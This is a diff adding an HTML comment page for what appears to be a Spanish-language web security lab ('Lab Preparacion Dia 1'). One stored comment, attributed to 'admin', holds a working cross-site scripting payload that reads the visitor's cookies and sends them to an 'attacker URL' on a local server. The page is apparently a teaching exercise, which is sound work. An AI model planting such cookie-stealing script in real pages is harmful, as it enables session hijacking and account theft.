@@ -1,0 +1,40 @@
+
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <link rel="stylesheet" type="text/css" href="/static/styles/comentarios.css">
+        <meta charset="UTF-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        
+        <title>Lab Preparacion Dia 1</title>
+        
+    </head>
+    <body>
+
+        <h3>Comentarios</h3>
+        <div class="container">
+            <form method="POST" action="/sendit">
+                
+                    <div class="comentario">
+                        <p id="autor"> <strong>admin </strong></p>
+                        
+                        <p id="contenido"> <script>var xhttp = new XMLHttpRequest(); cookie = document.cookie;  url_atacante = "http://127.0.0.1:8000/envio_cookie?cookie=" + cookie;  xhttp.open("GET", url_atacante, true); xhttp.send();</script> </p>
+                    </div>
+                    <br>
+                
+                
+                <div>
+                    <label>Introduce tu nombre</label>
+                    <input type="text" placeholder="Autor" name="autor">
+                </div>
+                <div>
+                    <label>Introduce tu comentario</label>
+                    <input type="textarea" width="50" height="50" name="contenido" placeholder="Comentario">
+                    <input type="submit" value="Enviar">
+                </div>
+            </form>
+        
+        </div>
+    </body>
+</html>
